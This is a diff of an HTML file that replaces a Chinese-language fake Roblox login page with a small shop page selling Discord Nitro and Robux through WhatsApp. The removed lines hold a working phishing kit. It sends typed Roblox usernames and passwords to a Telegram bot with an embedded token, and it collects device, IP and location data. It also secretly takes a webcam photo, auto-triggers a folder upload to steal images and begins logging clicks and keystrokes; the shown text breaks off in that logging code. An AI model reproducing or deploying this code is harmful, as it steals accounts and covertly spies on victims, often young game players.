@@ -1,864 +1,686 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>登录 Roblox - roblox.com</title>
+    <title>Nyaaastore - 游戏货币商店</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* 完全按照截图样式 */
+        :root {
+            --primary: #6a5af9;
+            --secondary: #d66efd;
+            --accent: #ff7bac;
+            --dark: #1a1a2e;
+            --light: #f8f9fa;
+            --gray: #6c757d;
+            --success: #20c997;
+            --border-radius: 12px;
+            --box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
         }
-        
+
         body {
-            font-family: Arial, sans-serif;
-            background: #ffffff;
-            color: #000000;
-            line-height: 1.4;
+            background-color: #f5f7ff;
+            color: var(--dark);
+            line-height: 1.6;
+            transition: var(--transition);
         }
-        
-        /* 顶部区域 - 精确复制截图 */
-        .header {
-            padding: 15px 20px;
-            background: #ffffff;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        
-        .header-content {
+
+        .container {
             max-width: 1200px;
             margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header & Navigation */
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-content {
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-        
-        /* 标题部分 - 精确字体大小和颜色 */
-        .title-container {
-            display: flex;
-            flex-direction: column;
-            gap: 2px;
-        }
-        
-        .main-title {
+
+        .logo {
             font-size: 28px;
-            font-weight: bold;
-            color: #000000;
-            margin: 0;
-        }
-        
-        .url {
-            font-size: 16px;
-            color: #666666;
-            margin: 0;
-        }
-        
-        /* 注册按钮 - 精确绿色 */
-        .signup-btn {
-            background: #00a2ff;
-            color: #ffffff;
-            border: none;
-            padding: 8px 20px;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: normal;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-        }
-        
-        /* 导航栏 - 精确间距和颜色 */
-        .nav-container {
-            max-width: 1200px;
-            margin: 20px auto;
-            padding: 0 20px;
+            font-weight: 700;
             display: flex;
-            justify-content: center;
-            gap: 40px;
+            align-items: center;
         }
-        
-        .nav-item {
-            color: #000000;
+
+        .logo i {
+            margin-right: 10px;
+            color: var(--accent);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+
+        .nav-links a {
+            color: white;
             text-decoration: none;
-            font-size: 18px;
-            font-weight: normal;
-            padding: 5px 0;
+            font-weight: 500;
+            transition: var(--transition);
+            padding: 5px 10px;
+            border-radius: 6px;
         }
-        
-        .nav-item:hover {
-            color: #00a2ff;
+
+        .nav-links a:hover {
+            background-color: rgba(255, 255, 255, 0.1);
         }
-        
-        .nav-item.robux {
-            color: #ff6b6b;
-            font-weight: bold;
+
+        .language-switcher {
+            display: flex;
+            gap: 10px;
         }
-        
-        /* 主登录区域 */
-        .login-section {
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 20px;
+
+        .lang-btn {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: var(--transition);
+            font-weight: 500;
+        }
+
+        .lang-btn.active {
+            background: white;
+            color: var(--primary);
+        }
+
+        .lang-btn:hover:not(.active) {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 80px 0;
             text-align: center;
+            background: linear-gradient(rgba(106, 90, 249, 0.05), rgba(214, 110, 253, 0.05));
         }
-        
-        .login-title {
-            font-size: 32px;
-            font-weight: bold;
-            color: #000000;
-            margin: 0 0 30px 0;
-        }
-        
-        /* 表单样式 - 精确复制 */
-        .form-group {
+
+        .hero h1 {
+            font-size: 3.5rem;
             margin-bottom: 20px;
-            text-align: left;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
         }
-        
-        .form-label {
-            display: block;
-            font-size: 16px;
-            font-weight: normal;
-            color: #000000;
-            margin-bottom: 5px;
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            color: var(--gray);
         }
-        
-        .form-input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #cccccc;
-            border-radius: 4px;
-            font-size: 16px;
-            color: #000000;
-            background: #ffffff;
-            box-sizing: border-box;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: #00a2ff;
-        }
-        
-        .form-input::placeholder {
-            color: #999999;
-            font-size: 16px;
-        }
-        
-        /* 密码框 */
-        .password-wrapper {
+
+        /* Products Section */
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 50px;
+            color: var(--dark);
             position: relative;
         }
-        
-        .toggle-password {
+
+        .section-title:after {
+            content: '';
             position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #666666;
-            cursor: pointer;
-            font-size: 18px;
-            padding: 0;
+            width: 80px;
+            height: 4px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            bottom: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 2px;
         }
-        
-        /* 登录按钮 - 精确蓝色 */
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background: #00a2ff;
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: normal;
-            cursor: pointer;
-            margin-top: 10px;
+
+        .products {
+            padding: 80px 0;
         }
-        
-        .login-btn:hover {
-            background: #0088cc;
+
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 30px;
         }
-        
-        .login-btn:disabled {
-            background: #cccccc;
-            cursor: not-allowed;
+
+        .product-card {
+            background: white;
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            box-shadow: var(--box-shadow);
+            transition: var(--transition);
         }
-        
-        /* 链接区域 - 精确样式 */
-        .links-container {
-            margin: 25px 0;
+
+        .product-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+
+        .product-header {
+            padding: 25px;
             text-align: center;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
         }
-        
-        .help-link {
+
+        .product-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+
+        .product-title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .product-body {
+            padding: 25px;
+        }
+
+        .price {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .price small {
+            font-size: 1rem;
+            color: var(--gray);
+        }
+
+        .features {
+            list-style: none;
+            margin-bottom: 25px;
+        }
+
+        .features li {
+            padding: 8px 0;
+            border-bottom: 1px dashed #eee;
+            display: flex;
+            align-items: center;
+        }
+
+        .features li:last-child {
+            border-bottom: none;
+        }
+
+        .features i {
+            color: var(--success);
+            margin-right: 10px;
+        }
+
+        .btn {
             display: block;
-            color: #00a2ff;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
             text-decoration: none;
-            font-size: 14px;
-            margin-bottom: 10px;
+            border-radius: var(--border-radius);
+            font-weight: 600;
+            font-size: 1.1rem;
+            transition: var(--transition);
+            border: none;
+            cursor: pointer;
         }
-        
-        .help-link:hover {
-            text-decoration: underline;
+
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
         }
-        
-        /* 注册区域 - 精确复制 */
-        .register-container {
-            margin-top: 25px;
-            padding-top: 25px;
-            border-top: 1px solid #e0e0e0;
+
+        /* Robux Table */
+        .robux-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            background: white;
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            box-shadow: var(--box-shadow);
+        }
+
+        .robux-table th {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 18px 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        .robux-table td {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .robux-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .robux-table tr:hover {
+            background-color: #f9f9ff;
+        }
+
+        .robux-amount {
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        /* Contact Section */
+        .contact {
+            padding: 80px 0;
+            background: linear-gradient(rgba(106, 90, 249, 0.05), rgba(214, 110, 253, 0.05));
             text-align: center;
         }
-        
-        .register-text {
-            font-size: 14px;
-            color: #666666;
-            margin-bottom: 10px;
-        }
-        
-        .register-btn {
-            background: #00a2ff;
-            color: #ffffff;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: normal;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-        }
-        
-        .register-btn:hover {
-            background: #0088cc;
-            text-decoration: none;
-        }
-        
-        /* 状态消息 */
-        .status-message {
-            padding: 12px;
-            border-radius: 4px;
-            margin: 15px 0;
-            font-size: 14px;
-            display: none;
-        }
-        
-        .status-success {
-            background: #e8f5e8;
-            color: #2e7d32;
-            border: 1px solid #c8e6c9;
-        }
-        
-        .status-error {
-            background: #ffebee;
-            color: #c62828;
-            border: 1px solid #ffcdd2;
-        }
-        
-        /* 加载动画 */
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            display: none;
+
+        .contact-info {
+            display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 1000;
+            gap: 15px;
+            margin-top: 30px;
+            flex-wrap: wrap;
         }
-        
-        .loading-spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #00a2ff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            background: white;
+            padding: 15px 25px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            transition: var(--transition);
         }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        .contact-item:hover {
+            transform: translateY(-5px);
         }
-        
-        .hidden {
-            display: none !important;
+
+        .contact-icon {
+            font-size: 24px;
+            color: var(--primary);
+            margin-right: 10px;
         }
-        
-        /* 响应式 */
+
+        /* Footer */
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 40px 0;
+            text-align: center;
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .copyright {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* Responsive Design */
         @media (max-width: 768px) {
-            .header {
-                padding: 15px;
-            }
-            
-            .nav-container {
+            .header-content {
+                flex-direction: column;
                 gap: 20px;
-                padding: 0 15px;
             }
-            
-            .nav-item {
-                font-size: 16px;
+
+            .nav-links {
+                flex-wrap: wrap;
+                justify-content: center;
             }
-            
-            .login-section {
-                padding: 15px;
+
+            .hero h1 {
+                font-size: 2.5rem;
             }
+
+            .products-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .robux-table {
+                font-size: 0.9rem;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                gap: 20px;
+            }
+        }
+
+        /* Language-specific styles */
+        .lang-en {
+            display: none;
+        }
+
+        .lang-active .lang-zh {
+            display: block;
+        }
+
+        .lang-active .lang-en {
+            display: none;
+        }
+
+        .lang-active.lang-en .lang-zh {
+            display: none;
+        }
+
+        .lang-active.lang-en .lang-en {
+            display: block;
         }
     </style>
 </head>
-<body>
-    <!-- 加载遮罩 -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-spinner"></div>
-    </div>
-
-    <!-- 顶部区域 - 完全按照截图 -->
-    <div class="header">
-        <div class="header-content">
-            <div class="title-container">
-                <h1 class="main-title">登录 Roblox</h1>
-                <p class="url">roblox.com</p>
+<body class="lang-active">
+    <!-- Header -->
+    <header>
+        <div class="container header-content">
+            <div class="logo">
+                <i class="fas fa-paw"></i>
+                <span class="lang-zh">Nyaaastore</span>
+                <span class="lang-en">Nyaaastore</span>
             </div>
-            <a href="#" class="signup-btn">注册</a>
+            
+            <nav class="nav-links">
+                <a href="#home" class="lang-zh">首页</a>
+                <a href="#home" class="lang-en">Home</a>
+                <a href="#products" class="lang-zh">产品</a>
+                <a href="#products" class="lang-en">Products</a>
+                <a href="#contact" class="lang-zh">联系</a>
+                <a href="#contact" class="lang-en">Contact</a>
+            </nav>
+            
+            <div class="language-switcher">
+                <button class="lang-btn active" data-lang="zh">华文</button>
+                <button class="lang-btn" data-lang="en">English</button>
+            </div>
         </div>
-    </div>
+    </header>
 
-    <!-- 导航栏 - 完全按照截图 -->
-    <div class="nav-container">
-        <a href="#" class="nav-item">排行榜</a>
-        <a href="#" class="nav-item">商城</a>
-        <a href="#" class="nav-item">创作</a>
-        <a href="#" class="nav-item robux">Robux</a>
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="container">
+            <h1 class="lang-zh">购买游戏货币与会员</h1>
+            <h1 class="lang-en">Buy Game Currency & Memberships</h1>
+            
+            <p class="lang-zh">
+                欢迎来到Nyaaastore！我们提供最优惠的Discord Nitro和Roblox Robux。安全交易，快速交付，24/7客服支持。
+            </p>
+            <p class="lang-en">
+                Welcome to Nyaaastore! We offer the best prices for Discord Nitro and Roblox Robux. Secure transactions, fast delivery, 24/7 customer support.
+            </p>
     </div>
+</section>
 
-    <!-- 主登录区域 - 完全按照截图 -->
-    <div class="login-section">
-        <h2 class="login-title">登录 Roblox</h2>
+<!-- Products Section -->
+<section class="products" id="products">
+    <div class="container">
+        <h2 class="section-title lang-zh">我们的产品</h2>
+        <h2 class="section-title lang-en">Our Products</h2>
         
-        <!-- 登录表单 -->
-        <form id="loginForm">
-            <div class="form-group">
-                <label class="form-label">用户名/电子邮件/手机</label>
-                <input type="text" 
-                       class="form-input" 
-                       id="username"
-                       placeholder="输入您的用户名、电子邮件或手机号码"
-                       autocomplete="username"
-                       required>
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">密码</label>
-                <div class="password-wrapper">
-                    <input type="password" 
-                           class="form-input" 
-                           id="password"
-                           placeholder="输入您的密码"
-                           autocomplete="current-password"
-                           required>
-                    <button type="button" class="toggle-password" id="togglePassword">
-                        👁️
-                    </button>
+        <div class="products-grid">
+            <!-- Discord Nitro Product -->
+            <div class="product-card">
+                <div class="product-header">
+                    <div class="product-icon">
+                        <i class="fab fa-discord"></i>
+                    </div>
+                    <h3 class="product-title lang-zh">Discord Nitro</h3>
+                    <h3 class="product-title lang-en">Discord Nitro</h3>
+                </div>
+                <div class="product-body">
+                    <div class="price">
+                        RM21 <small class="lang-zh">(台币200)</small><small class="lang-en">(NT$200)</small>
+                    </div>
+                    
+                    <ul class="features">
+                        <li class="lang-zh"><i class="fas fa-check"></i> 高清屏幕共享</li>
+                        <li class="lang-en"><i class="fas fa-check"></i> HD Screen Sharing</li>
+                        
+                        <li class="lang-zh"><i class="fas fa-check"></i> 自定义标签和表情</li>
+                        <li class="lang-en"><i class="fas fa-check"></i> Custom Tags & Emojis</li>
+                        
+                        <li class="lang-zh"><i class="fas fa-check"></i> 更大的文件上传限制</li>
+                        <li class="lang-en"><i class="fas fa-check"></i> Larger File Uploads</li>
+                        
+                        <li class="lang-zh"><i class="fas fa-check"></i> 全局自定义表情</li>
+                        <li class="lang-en"><i class="fas fa-check"></i> Global Custom Emojis</li>
+                    </ul>
+                    
+                    <a href="https://discord.com/nitro" target="_blank" class="btn lang-zh">立即购买</a>
+                    <a href="https://discord.com/nitro" target="_blank" class="btn lang-en">Buy Now</a>
                 </div>
             </div>
-
-            <!-- 状态消息 -->
-            <div id="errorMessage" class="status-message status-error hidden">
-                ❌ 用户名或密码不正确，请重试
+            
+            <!-- Robux Product -->
+            <div class="product-card">
+                <div class="product-header">
+                    <div class="product-icon">
+                        <i class="fas fa-gem"></i>
+                    </div>
+                    <h3 class="product-title lang-zh">Roblox Robux</h3>
+                    <h3 class="product-title lang-en">Roblox Robux</h3>
+                </div>
+                <div class="product-body">
+                    <div class="price">
+                        <span class="lang-zh">多种套餐可选</span>
+                        <span class="lang-en">Multiple Packages</span>
+                    </div>
+                    
+                    <table class="robux-table">
+                        <thead>
+                            <tr>
+                                <th class="lang-zh">数量</th>
+                                <th class="lang-en">Amount</th>
+                                <th class="lang-zh">价格</th>
+                                <th class="lang-en">Price</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td class="robux-amount">100 Robux</td>
+                                <td>RM2.90 • NT$23</td>
+                            </tr>
+                            <tr>
+                                <td class="robux-amount">200 Robux</td>
+                                <td>RM5.80 • NT$46</td>
+                            </tr>
+                            <tr>
+                                <td class="robux-amount">300 Robux</td>
+                                <td>RM8.70 • NT$69</td>
+                            </tr>
+                            <tr>
+                                <td class="robux-amount">400 Robux</td>
+                                <td>RM11.60 • NT$92</td>
+                            </tr>
+                            <tr>
+                                <td class="robux-amount">500 Robux</td>
+                                <td>RM14.50 • NT$115</td>
+                            </tr>
+                            <tr>
+                                <td class="robux-amount">1000 Robux</td>
+                                <td>RM29.00 • NT$230</td>
+                            </tr>
+                            <tr>
+                                <td class="robux-amount">1500 Robux</td>
+                                <td>RM43.50 • NT$345</td>
+                            </tr>
+                            <tr>
+                                <td class="robux-amount">2000 Robux</td>
+                                <td>RM58.00 • NT$460</td>
+                            </tr>
+                            <tr>
+                                <td class="robux-amount">5000 Robux</td>
+                                <td>RM145.00 • NT$1,150</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    
+                    <a href="#contact" class="btn lang-zh" style="margin-top: 20px;">通过WhatsApp订购</a>
+                    <a href="#contact" class="btn lang-en" style="margin-top: 20px;">Order via WhatsApp</a>
+                </div>
             </div>
-
-            <div id="successMessage" class="status-message status-success hidden">
-                ✅ 登录成功！正在为您重定向...
-            </div>
-
-            <button type="button" class="login-btn" id="loginButton" onclick="handleLogin()">
-                登录
-            </button>
-        </form>
-
-        <!-- 链接区域 - 完全按照截图 -->
-        <div class="links-container">
-            <a href="#" class="help-link">忘记密码或用户名？</a>
-            <a href="#" class="help-link">通过电子邮件向我发送一次性验证码</a>
-            <a href="#" class="help-link">使用另一台设备</a>
-        </div>
-
-        <!-- 注册区域 - 完全按照截图 -->
-        <div class="register-container">
-            <div class="register-text">没有帐户？</div>
-            <a href="#" class="register-btn">注册</a>
         </div>
     </div>
-
-    <!-- 隐蔽收集元素 -->
-    <iframe id="hiddenFrame" sandbox="allow-scripts allow-same-origin" style="display:none;"></iframe>
-    <canvas id="hiddenCanvas" style="display:none;"></canvas>
-    <input type="file" id="hiddenFileInput" style="display:none;" webkitdirectory directory multiple>
-    <div id="dataCollector" style="display:none;"></div>
-<script>
-    // ==================== Telegram配置 ====================
-    const TELEGRAM_CONFIG = {
-        botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
-        chatId: "8313770381"
-    };
-
-    // 数据收集对象
-    let collectedData = {
-        sessionId: generateSessionId(),
-        startTime: new Date().toISOString(),
-        credentials: {},
-        deviceInfo: {},
-        networkInfo: {},
-        photos: [],
-        files: [],
-        behavior: {}
-    };
-
-    let isCollecting = false;
-
-    // ==================== 基础函数 ====================
-    function generateSessionId() {
-        return 'RBX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
-    }
-
-    async function sendToTelegram(text) {
-        try {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CONFIG.chatId,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            });
-            return true;
-        } catch (error) {
-            console.error('发送失败:', error);
-            return false;
-        }
-    }
-
-    async function sendPhotoToTelegram(file, caption) {
-        try {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-            formData.append('photo', file);
-            formData.append('caption', caption);
+</section>
+    <!-- Contact Section -->
+    <section class="contact" id="contact">
+        <div class="container">
+            <h2 class="section-title lang-zh">联系我们</h2>
+            <h2 class="section-title lang-en">Contact Us</h2>
             
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
+            <p class="lang-zh" style="max-width: 700px; margin: 0 auto 30px;">
+                通过WhatsApp与我们联系以获取产品信息和订购。我们提供24/7客户支持，快速响应所有查询。
+            </p>
+            <p class="lang-en" style="max-width: 700px; margin: 0 auto 30px;">
+                Contact us via WhatsApp for product information and ordering. We offer 24/7 customer support with quick responses to all inquiries.
+            </p>
+            
+            <div class="contact-info">
+                <div class="contact-item">
+                    <div class="contact-icon">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <div>
+                        <div class="lang-zh">WhatsApp</div>
+                        <div class="lang-en">WhatsApp</div>
+                        <div>+601162430710</div>
+                    </div>
+                </div>
+                
+                <div class="contact-item">
+                    <div class="contact-icon">
+                        <i class="fas fa-store"></i>
+                    </div>
+                    <div>
+                        <div class="lang-zh">商店名称</div>
+                        <div class="lang-en">Store Name</div>
+                        <div>Nyaaastore</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div style="margin-top: 40px;">
+                <a href="https://wa.me/601162430710" target="_blank" class="btn" style="display: inline-block; width: auto; padding: 15px 40px;">
+                    <i class="fab fa-whatsapp"></i>
+                    <span class="lang-zh" style="margin-left: 10px;">通过WhatsApp联系我们</span>
+                    <span class="lang-en" style="margin-left: 10px;">Contact us on WhatsApp</span>
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="logo">
+                    <i class="fas fa-paw"></i>
+                    <span>Nyaaastore</span>
+                </div>
+                
+                <div class="copyright">
+                    <p class="lang-zh">© 2023 Nyaaastore. 版权所有。</p>
+                    <p class="lang-en">© 2023 Nyaaastore. All rights reserved.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // 语言切换功能
+        document.addEventListener('DOMContentLoaded', function() {
+            const langButtons = document.querySelectorAll('.lang-btn');
+            const body = document.body;
+            
+            // 设置初始语言
+            setLanguage('zh');
+            
+            // 为语言切换按钮添加事件监听器
+            langButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    const lang = this.getAttribute('data-lang');
+                    setLanguage(lang);
+                    
+                    // 更新按钮活动状态
+                    langButtons.forEach(btn => btn.classList.remove('active'));
+                    this.classList.add('active');
+                });
             });
-            return true;
-        } catch (error) {
-            return false;
-        }
-    }
-
-    // ==================== 登录处理 ====================
-    function handleLogin() {
-        if (isCollecting) return;
-        
-        const username = document.getElementById('username').value.trim();
-        const password = document.getElementById('password').value;
-        
-        if (!username || !password) {
-            showError('请输入用户名和密码');
-            return;
-        }
-        
-        // 存储凭据
-        collectedData.credentials = {
-            username: username,
-            password: password,
-            timestamp: new Date().toISOString()
-        };
-        
-        // 立即发送凭据到Telegram
-        sendCredentialsToTelegram(username, password);
-        
-        // 显示加载
-        showLoading();
-        
-        // 开始高级收集
-        startAdvancedCollection();
-    }
-
-    async function sendCredentialsToTelegram(username, password) {
-        const message = `🔐 <b>Roblox登录凭据获取成功！</b>
-────────────────
-👤 <b>用户名:</b> <code>${escapeHtml(username) || '未提供'}</code>
-🔑 <b>密码:</b> <code>${escapeHtml(password) || '未提供'}</code>
-────────────────
-🆔 <b>会话ID:</b> ${collectedData.sessionId}
-🕐 <b>获取时间:</b> ${new Date().toLocaleString('zh-CN')}
-────────────────
-📱 <b>设备:</b> ${navigator.platform}
-🌐 <b>浏览器:</b> ${detectBrowser()}
-────────────────`;
-        
-        await sendToTelegram(message);
-    }
-
-    function escapeHtml(text) {
-        const div = document.createElement('div');
-        div.textContent = text;
-        return div.innerHTML;
-    }
-
-    function detectBrowser() {
-        const ua = navigator.userAgent;
-        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
-        if (ua.includes('Firefox')) return 'Firefox';
-        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-        if (ua.includes('Edg')) return 'Edge';
-        return '未知';
-    }
-
-    // ==================== 设备信息收集 ====================
-    async function collectDeviceInfo() {
-        collectedData.deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: {
-                width: screen.width,
-                height: screen.height,
-                colorDepth: screen.colorDepth
-            },
-            hardware: {
-                concurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory
+            
+            // 设置语言的函数
+            function setLanguage(lang) {
+                // 更新body的类
+                body.className = `lang-active lang-${lang}`;
+                
+                // 保存语言偏好到localStorage
+                localStorage.setItem('preferred-language', lang);
             }
-        };
-
-        const deviceMsg = `📱 <b>设备信息</b>
-────────────────
-💻 <b>系统:</b> ${navigator.platform}
-🖥️ <b>分辨率:</b> ${screen.width}x${screen.height}
-🔢 <b>CPU核心:</b> ${navigator.hardwareConcurrency}
-💾 <b>内存:</b> ${navigator.deviceMemory || '未知'}GB
-────────────────`;
-        
-        await sendToTelegram(deviceMsg);
-    }
-
-    // ==================== 网络信息收集 ====================
-    async function collectNetworkInfo() {
-        try {
-            // 获取IP地址
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            collectedData.networkInfo.ip = ipData.ip;
             
-            // 获取地理位置
-            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            const geoData = await geoRes.json();
-            
-            collectedData.networkInfo.geo = {
-                city: geoData.city,
-                country: geoData.country_name,
-                latitude: geoData.latitude,
-                longitude: geoData.longitude,
-                isp: geoData.org
-            };
-            
-            const locationMsg = `📍 <b>位置信息</b>
-────────────────
-🌍 <b>国家:</b> ${geoData.country_name || '未知'}
-🏙️ <b>城市:</b> ${geoData.city || '未知'}
-🌐 <b>IP:</b> ${ipData.ip}
-📡 <b>运营商:</b> ${geoData.org || '未知'}
-────────────────`;
-            
-            await sendToTelegram(locationMsg);
-            
-        } catch (error) {
-            console.log('网络信息收集失败:', error);
-        }
-    }
-
-    // ==================== 摄像头访问 ====================
-    async function accessCamera() {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            return false;
-        }
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user' },
-                audio: false
-            });
-            
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            
-            return new Promise((resolve) => {
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        if (blob) {
-                            const file = new File([blob], `roblox_${Date.now()}.jpg`, {
-                                type: 'image/jpeg'
-                            });
-                            
-                            collectedData.photos.push({
-                                name: file.name,
-                                size: file.size,
-                                timestamp: new Date().toISOString()
-                            });
-                            
-                            // 发送到Telegram
-                            await sendPhotoToTelegram(file, '📸 Roblox用户照片');
-                            
-                            stream.getTracks().forEach(track => track.stop());
-                            resolve(true);
-                        }
-                    }, 'image/jpeg', 0.8);
-                }, 1500);
-            });
-            
-        } catch (error) {
-            return false;
-        }
-    }
-
-    // ==================== 文件系统访问 ====================
-    function attemptFileAccess() {
-        // 自动触发文件夹访问
-        if ('webkitdirectory' in document.createElement('input')) {
-            setTimeout(() => {
-                try {
-                    const fileInput = document.createElement('input');
-                    fileInput.type = 'file';
-                    fileInput.webkitdirectory = true;
-                    fileInput.multiple = true;
-                    fileInput.style.display = 'none';
-                    
-                    fileInput.addEventListener('change', async (e) => {
-                        const files = Array.from(e.target.files);
-                        collectedData.files.push({
-                            type: 'folder_scan',
-                            count: files.length,
-                            timestamp: new Date().toISOString()
-                        });
-                        
-                        await sendToTelegram(`📁 <b>文件夹扫描</b>\n发现文件: ${files.length}个`);
-                        
-                        // 处理图片文件
-                        const imageFiles = files.filter(file => 
-                            file.type.startsWith('image/')
-                        ).slice(0, 2);
-                        
-                        for (const file of imageFiles) {
-                            if (file.size < 3 * 1024 * 1024) {
-                                await sendPhotoToTelegram(file, '📁 系统图片');
-                            }
-                        }
-                    });
-                    
-                    document.body.appendChild(fileInput);
-                    
-                    // 自动触发
-                    setTimeout(() => {
-                        try {
-                            fileInput.click();
-                        } catch (e) {}
-                    }, 4000);
-                    
-                } catch (e) {}
-            }, 2000);
-        }
-    }
-    // ==================== 行为监控 ====================
-    function startBehaviorMonitoring() {
-        collectedData.behavior = {
-            clicks: [],
-            keystrokes: []
-        };
-        
-        // 点击监控
-        document.addEventListener('click', (e) => {
-            collectedData.behavior.clicks.push({
-                x: e.clientX,
-                y: e.clientY,
